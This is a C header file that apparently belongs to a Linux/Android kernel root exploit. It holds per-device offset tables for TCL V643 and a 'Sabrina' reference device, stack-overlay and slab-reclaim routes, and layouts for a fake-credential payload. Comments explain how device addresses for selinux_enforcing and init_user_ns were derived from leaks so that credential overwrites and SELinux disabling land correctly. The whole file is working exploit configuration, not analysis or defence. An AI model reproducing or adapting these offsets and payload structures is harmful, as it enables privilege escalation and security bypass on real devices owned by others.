#ifndef OFFSETS_H
#define OFFSETS_H

#include <stdint.h>

enum ghost_stack_overlay_route {
  GHOST_STACK_OVERLAY_SEQPACKET = 0,
  GHOST_STACK_OVERLAY_TCL_V643_PSELECT6 = 1,
  /* Exact V643 Full-LTO geometry validated in the ARM32 compat syscall
   * path.  This route requires an AArch32 waiter/helper; an AArch64 syscall
   * reaches the native copy and misses the stale waiter. */
  GHOST_STACK_OVERLAY_TCL_V643_MCAST_COMPAT = 2,
  /* Persistent AArch32 _newselect carrier.  Unlike the MCAST copy, the
   * controlled fd bitmaps remain on the kernel stack while select blocks. */
  GHOST_STACK_OVERLAY_TCL_V643_NEWSELECT_COMPAT = 3,
};

enum ghost_reclaim_route {
  /* Original choreography measured on the Sabrina reference device. */
  GHOST_RECLAIM_REFERENCE_SABRINA = 0,
  /* TCL has matching order-2 object geometry, but its CPU/node-partial and
   * PCP choreography has not been demonstrated on the exact V643 kernel. */
  GHOST_RECLAIM_TCL_V643_UNPROVEN = 1,
  /* Exact V643 sequence validated in the full-kernel harness: 16 node
   * partial ballast slabs, one fully controlled target slab, then eight
   * one-object drain slabs interleaved with order-2 io_uring allocations. */
  GHOST_RECLAIM_TCL_V643_EXACT = 2,
};

struct kernel_offsets {
  const char *uname_r;
  /* Profiles may be committed before every dangerous address/geometry value
   * is proven.  Such entries are visible to offline tooling but must never
   * arm the exploit. */
  uint8_t analysis_only;
  uint8_t stack_overlay_route;
  uint8_t reclaim_route;
  const char *analysis_blocker;
  /* Physical load address of the kernel image, chosen by the bootloader.
   * Varies per SoC/board and is not derivable from boot.img — read it from
   * "Kernel code" in /proc/iomem on a rooted unit of the same model
   * (subtract _stext-_text, normally 0x10000). 0 = fall back to
   * P0_KERNEL_PHYS_LOAD from target.h. Wrong value => every write lands in
   * unrelated RAM: no crash, no effect, very hard to debug. */
  uint64_t kernel_phys_load;
  uint64_t phys_offset;
  uint64_t page_offset;
  uint64_t direct_map_base, direct_map_end;
  uint64_t vmemmap_start;
  uint64_t kernelsnitch_identity_start, kernelsnitch_identity_end;
  uint32_t mm_struct_size;
  uint32_t mm_slab_order;
  uint32_t slub_min_partial;
  uint32_t slub_cpu_partial;
  uint64_t off_init_task, off_init_cred, off_init_uts_ns, off_empty_zero_page;
  uint64_t off_root_task_group, off_selinux_enforcing, off_kptr_restrict;
  uint64_t off_selinux_blob_sizes, off_security_hook_heads, off_kmalloc_caches;
  uint64_t off_anon_pipe_buf_ops, off_ashmem_misc_fops, off_ashmem_fops;
  uint64_t off_ashmem_ioctl, off_ashmem_compat_ioctl, off_ashmem_mmap;
  uint64_t off_ashmem_open, off_ashmem_release, off_ashmem_show_fdinfo;
  uint64_t off_configfs_read_iter, off_configfs_bin_write_iter;
  uint64_t off_copy_splice_read, off_noop_llseek, off_cap_capable_active;
  uint64_t off_slide_nfulnl_logger, off_slide_loggers_0_1, off_slide_boot_id;
  /* Device-build addresses (anchor-relative = kaslr_base-relative).
   * The device kernel (ThinLTO/clang-17) has .text+.rodata ~7.5MB larger
   * than the reference vmlinux, shifting the whole .data/.bss region, so
   * the reference-table offsets above are NOT device-valid for data
   * symbols (they point into .rodata on the device). The *_device fields
   * carry corrected addresses derived from the pstore boot-log section
   * layout + the reference offset-in-section, cross-verified on device
   * via perf-leaked symbol pairs. 0 = unknown. */
  /* Device section map (pstore boot log, stable per build; anchor =
   * kaslr_base = device _text - 0x80000):
   *   .text  anchor+0x0080000 .. +0x11E0000
   *   .rodata anchor+0x11E0000 .. +0x1830000
   *   .init  anchor+0x1830000 .. +0x19C0000
   *   .data  anchor+0x19C0000 .. +0x1BC6808
   *   .bss   anchor+0x1BC6808 .. +0x1CF2144
   * selinux_state: the leak found the selinux_avc/selinux_state pair
   * (reference .bss+0x3FEA0 / +0x416C8, delta 0x1828 EXACTLY) at
   * anchor+0x1C07708 / +0x1C08F30 - the SAME 0x1828 delta, i.e. the
   * .bss prefix shifted uniformly +0x1060 from the reference. The naive
   * boot-log derivation (0x1C07ED0) missed that shift and landed inside
   * selinux_avc (an empty avc_cache bucket - survived, enforce stayed 1). */
  uint64_t off_selinux_enforcing_device;
  /* Device &init_user_ns = boot-log .data start (0x19C0000) + reference
   * offset-in-.data (0x2B080). The .data internal layout is preserved
   * (zero shift): the leak candidate anchor+0x19C9600 is exactly
   * mount_lock (reference .data+0x9600). Needed as fake_cred->user_ns:
   * cap_capable() must match ns == cred->user_ns on the first
   * iteration or every capable() call dies at
   * `if (ns == &init_user_ns) return -EPERM`. */
  uint64_t off_init_user_ns_device;
  /* REFERENCE-vmlinux &init_user_ns (NOT device-valid). Kept only as the
   * setpriority-storm trigger for the nice(-20) preemption shield and
   * the candidate census diagnostic. */
  uint64_t off_init_user_ns;

  /* UMH root: workqueue symbol offsets (0 = not available for this kernel) */
  uint64_t off_system_unbound_wq;
  uint64_t off_call_usermodehelper_exec_work;

  /* Per-kernel-version struct field offsets. 0 = use target.h default (6.12). */
  uint32_t task_usage, task_cpu;
  uint32_t task_prio, task_normal_prio, task_sched_task_group;
  uint32_t task_uclamp_req, task_uclamp;
  uint32_t task_pi_lock, task_pi_waiters, task_pi_top_task, task_pi_blocked_on;
  uint32_t task_pid, task_tgid, task_real_parent, task_atomic_flags;
  uint32_t task_real_cred, task_cred, task_comm, task_tasks, task_seccomp;
  uint32_t mm_owner;
  uint32_t waiter_compact;
  uint64_t kimage_text_base;

  /* Layout values which were previously hard-coded for one reference GKI.
   * Vendor 5.15 kernels can and do differ. */
  uint32_t waiter_size, waiter_pi_tree, waiter_task, waiter_lock;
  uint32_t waiter_wake_state, waiter_prio, waiter_deadline, waiter_ww_ctx;
  uint32_t rt_mutex_size, rt_mutex_waiters, rt_mutex_owner;
  uint32_t struct_page_size, struct_page_compound_head;
  uint32_t struct_page_type, struct_slab_cache;

  /* struct cred layout used by the fake-credential payload. */
  uint32_t cred_size, cred_usage, cred_uid, cred_gid;
  uint32_t cred_suid, cred_sgid, cred_euid, cred_egid;
  uint32_t cred_fsuid, cred_fsgid, cred_securebits;
  uint32_t cred_cap_inh, cred_cap_prm, cred_cap_eff;
  uint32_t cred_cap_bset, cred_cap_amb;
  uint32_t cred_security, cred_user, cred_user_ns;
  uint32_t cred_ucounts, cred_group_info;

  /* Supporting objects referenced by the fake cred. */
  uint32_t task_security_size, task_security_osid, task_security_sid;
  uint32_t user_struct_size, user_struct_count;
  uint32_t ucounts_size, ucounts_ns, ucounts_count;
  uint32_t group_info_usage, group_info_ngroups, group_info_gid;
  uint32_t user_ns_size, user_ns_gid_map, user_ns_projid_map;
  uint32_t user_ns_ns, user_ns_ucounts, user_ns_ucount_max;
  uint32_t user_ns_ucount_max_count;
  uint32_t ns_common_count;
  uint32_t uid_gid_map_size, uid_gid_map_nr_extents, uid_gid_map_extent;
  uint32_t payload_fake_cred, payload_fake_security, payload_fake_user;
  uint32_t payload_fake_ucounts, payload_fake_group_info;
  uint32_t payload_fake_user_ns;

  /* Per-kernel-version file_operations field offsets.
   * 0 = use target.h default (6.12 layout with fop_flags).
   * 5.10/6.1 lack fop_flags so every field before .unlocked_ioctl shifts. */
  uint32_t fops_llseek, fops_read, fops_write, fops_read_iter, fops_write_iter;
  uint32_t fops_ioctl, fops_compat_ioctl, fops_mmap;
  uint32_t fops_open, fops_release, fops_splice_read, fops_show_fdinfo;
};

#define OFFSETS_ENTRY(uname, ...) { .uname_r = uname, __VA_ARGS__ }

#define STRUCT_OFFSETS_6_12 \
  .task_prio=0x94, .task_normal_prio=0x9C, .task_sched_task_group=0x420, \
  .task_pi_lock=0x9EC, .task_pi_waiters=0xA00, \
  .task_pi_top_task=0xA10, .task_pi_blocked_on=0xA18, \
  .task_pid=0x708, .task_tgid=0x70C, .task_real_parent=0x718, \
  .task_atomic_flags=0x6C8, .task_real_cred=0x8F8, .task_cred=0x900, \
  .task_comm=0x910, .task_tasks=0x638, .task_seccomp=0x9C8, \
  .mm_owner=0x410

#define STRUCT_OFFSETS_6_1 \
  .task_prio=0x84, .task_normal_prio=0x8C, .task_sched_task_group=0x340, \
  .task_pi_lock=0x924, .task_pi_waiters=0x938, \
  .task_pi_top_task=0x948, .task_pi_blocked_on=0x950, \
  .task_pid=0x6D8, .task_tgid=0x6DC, .task_real_parent=0x688, \
  .task_atomic_flags=0x638, .task_real_cred=0x830, .task_cred=0x838, \
  .task_comm=0x848, .task_tasks=0x678, .task_seccomp=0xAA0, \
  .mm_owner=0x298, .waiter_compact=1, \
  .fops_llseek=0x08, .fops_read=0x10, .fops_write=0x18, .fops_read_iter=0x20, \
  .fops_write_iter=0x28, .fops_open=0x70, .fops_release=0x80, \
  .fops_splice_read=0xC8, .fops_show_fdinfo=0xE0

#define STRUCT_OFFSETS_5_10 \
  .task_prio=0x84, .task_normal_prio=0x8C, .task_sched_task_group=0x310, \
  .task_pi_lock=0x86C, .task_pi_waiters=0x880, \
  .task_pi_top_task=0x890, .task_pi_blocked_on=0x898, \
  .task_pid=0x5C8, .task_tgid=0x5CC, .task_real_parent=0x5D8, \
  .task_atomic_flags=0x590, .task_real_cred=0x778, .task_cred=0x780, \
  .task_comm=0x790, .task_tasks=0x4C8, .task_seccomp=0x848, \
  .mm_owner=0x348, .waiter_compact=1, \
  .fops_llseek=0x08, .fops_read=0x10, .fops_write=0x18, .fops_read_iter=0x20, \
  .fops_write_iter=0x28, .fops_open=0x70, .fops_release=0x80, \
  .fops_splice_read=0xC8, .fops_show_fdinfo=0xE0

#define STRUCT_OFFSETS_6_6 \
  .task_prio=0x84, .task_normal_prio=0x8C, .task_sched_task_group=0x348, \
  .task_pi_lock=0x90C, .task_pi_waiters=0x920, \
  .task_pi_top_task=0x930, .task_pi_blocked_on=0x938, \
  .task_pid=0x618, .task_tgid=0x61C, .task_real_parent=0x628, \
  .task_atomic_flags=0x5D8, .task_real_cred=0x818, .task_cred=0x820, \
  .task_comm=0x830, .task_tasks=0x550, .task_seccomp=0x8E8, \
  .mm_owner=0x2B0

static const struct kernel_offsets known_offsets[] = {
#include "sabrina/offsets.h"
#include "tcl_v643/offsets.h"
  { .uname_r = NULL }
};

#endif
